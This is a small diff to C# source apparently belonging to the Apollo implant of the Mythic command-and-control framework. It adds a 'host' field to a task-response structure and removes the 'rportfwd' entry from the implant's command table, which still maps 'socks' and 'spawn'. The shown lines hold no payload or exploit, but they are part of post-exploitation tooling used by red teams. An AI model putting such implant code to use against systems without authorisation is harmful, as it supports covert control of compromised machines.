@@ -157,6 +157,7 @@ namespace Apollo
             public Mythic.Structs.EdgeNode[] edges;
             public object file_browser;
             public string full_path;
+            public string host;
             public long total_chunks;
             public string message_id;
             public int chunk_num;
@@ -184,6 +185,7 @@ namespace Apollo
                 credentials = null;
                 removed_files = null;
                 artifacts = null;
+                host = null;
 
                 if (userOutput != null && userOutput.GetType() != typeof(string))
                 {
@@ -428,9 +430,6 @@ namespace Apollo
 #endif
 #if SOCKS
                 { "socks", "Socks" },
-#endif
-#if RPORTFWD
-                { "rportfwd", "RPortFwd" },
 #endif
 #if SPAWN
                 { "spawn", "Spawn" },
